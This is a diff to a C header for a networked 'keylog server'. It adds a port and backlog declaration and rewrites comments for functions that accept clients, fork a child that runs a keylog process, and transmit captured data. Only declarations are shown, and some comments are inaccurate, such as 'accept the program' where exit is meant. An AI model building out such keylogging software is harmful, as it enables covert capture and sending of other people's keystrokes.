@@ -16,6 +16,11 @@
 
 #include "keylogger.h"
 
+// The port number that the server listens on.
+extern const uint16_t PORT;
+
+enum { BACKLOG_SIZE = 10 };
+
 // Group the data needed for a server to run.
 typedef struct {
   /// The socket descriptor to listen for connections.
@@ -68,7 +73,7 @@ void close_server(int socket_descriptor);
 struct sockaddr_in socket_address(in_addr_t addr, in_port_t port);
 
 /**
- * Create a new echo server in dynamic memory.
+ * Create a new keylog server in dynamic memory.
  *
  * Given a socket address and a maximum backlog size, create a new echo server
  * on the heap. Since the new server (or rather, the data it stores) is
@@ -83,7 +88,7 @@ struct sockaddr_in socket_address(in_addr_t addr, in_port_t port);
 keylog_server* make_keylog_server(struct sockaddr_in ip_addr, int max_backlog);
 
 /**
- * Free an echo server in dynamic memory.
+ * Free an keylog server in dynamic memory.
  *
  * Given a pointer to an echo server on the heap, free the dynamically allocated
  * memory associated with that server. Attempting to free an uninitialized
@@ -106,11 +111,29 @@ void transmit_data(void);
 void clear_data_queue(void);
 
 /**
- * listen for a new client
+ * Start listening on a server for potential client connections.
+ *
+ * Bind the listener socket and set it to listen for client connection requests.
+ * The listener socket is part of the server's internal data and does not need
+ * to be opened separately. In the event that binding or listening on the socket
+ * fails, print an error message and exit the program without returning.
+ *
+ * @param keylogger The keylog_server to start listening on.
  */
 void listen_for_client(keylog_server* keylogger);
 
 /**
- * accept a new client
+ * Accept a new client connection and start the keylog process.
+ *
+ * Wait until a client connection request comes in, accepting it. Once accepted,
+ * fork a new process. In the child process, run the keylog process, and in the
+ * parent, end the function. The server program should run the function in a
+ * loop, whereas the child can exit the function after the keylog process. In
+ * the event of an error in accepting a connection or forking a new process,
+ * print an appropriate error message and accept the program.
+ *
+ * @param server The server to accept the connection on.
+ * @return 0 for the parent process and -1 for the child (keylog) process.
  */
+
 int accept_client(keylog_server* keylogger);
